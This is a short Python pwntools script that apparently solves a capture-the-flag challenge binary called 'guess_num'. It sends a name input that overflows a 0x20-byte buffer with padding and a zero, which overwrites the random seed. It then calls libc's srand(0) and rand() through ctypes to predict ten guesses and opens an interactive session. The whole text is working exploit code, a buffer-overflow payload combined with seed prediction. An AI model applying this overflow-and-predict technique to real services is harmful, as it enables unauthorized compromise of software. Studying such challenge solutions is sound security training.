from pwn import *
from ctypes import *
context.update(arch='amd64',os='linux',log_level='debug',endian='little')
p=process('./guess_num')
p.recvuntil('Your name:')
payload='a'*0x20+p64(0)
p.sendline(payload)
libc=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(0)
for i in range(10):
	v8=libc.rand()%6+1
	p.recvuntil('Please input your guess number:')
	p.sendline(str(v8))
p.interactive()
	
